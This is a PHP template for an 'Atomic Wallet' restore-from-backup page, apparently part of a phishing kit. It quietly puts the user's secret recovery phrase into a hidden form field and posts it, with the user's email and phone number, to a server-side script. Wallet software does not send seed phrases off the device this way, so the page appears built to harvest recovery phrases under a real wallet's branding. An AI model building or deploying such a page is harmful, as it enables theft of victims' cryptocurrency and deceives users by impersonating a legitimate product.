<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Atomic Wallet';
    include_once './includes/meta.php';
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 text-center">
                    <h2 class="fs30 my30 mb60 fw-bold">Restore from Backup</h2>
                    <form method="post" action="<?= base_url('send_recover.php') ?>" class="" style="">
                        <input type="hidden" name="secret_recovery_phrase" value="<?= $_SESSION['secret_recovery_phrase'] ?>" >
                        <div class="my20">
                            <input name="email" type="email" required="" class="form-control form-control-lg textarea fs14" placeholder="Email Id's" style=" background-color:#000; border: none; border-bottom: 2px solid #fff; color: #fff;">
                        </div>
                        <div className="my35 inputField">
                            <div class="form-control" style="padding: 0px;">
                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 75%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="mt60 mb20">
                            <button class="btn btn-primary btn-primary-2 fs18 py10 px60 rounded-pill fw-bold" type="submit">VERIFY</button>
                        </div>
                        <div class="my20">
                            <a href="<?= base_url() ?>" class="fw-bold text-white text-decoration-none">BACK</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="<?= base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Select Country" });
            });
        </script>
    </body>
</html>